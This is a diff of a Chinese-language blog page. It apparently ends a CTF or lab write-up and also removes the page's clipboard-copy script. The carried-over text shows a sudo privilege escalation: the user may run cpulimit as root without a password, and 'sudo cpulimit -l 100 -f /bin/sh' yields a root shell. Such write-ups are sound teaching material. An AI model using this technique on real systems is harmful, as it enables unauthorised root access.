+<pre lang="bash" class="notranslate"><code class="notranslate">erik@canto:~$ sudo -l
+Matching Defaults entries for erik on canto:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
 User erik may run the following commands on canto:
-    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/bin/cpulimit
-</pre></div>
+    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
+
+</code></pre>
 <p><a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo" rel="nofollow">cpulimit sudo 提权方法</a></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">erik@canto:<span class="pl-k">~</span>$ sudo cpulimit -l 100 -f /bin/sh
+<pre lang="bash" class="notranslate"><code class="notranslate">erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
 Process 2669 detected
-<span class="pl-c"><span class="pl-c">#</span> id</span>
-uid=0(root) gid=0(root) groups=0(root)</pre></div></div>
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -497,7 +499,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -543,70 +545,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1umph.top/plugins/TOC.js'></script><script src='https://7r1umph.top/plugins/lightbox.js'></script><script src='https://7r1umph.top/plugins/LazyLoadImages.js'></script>
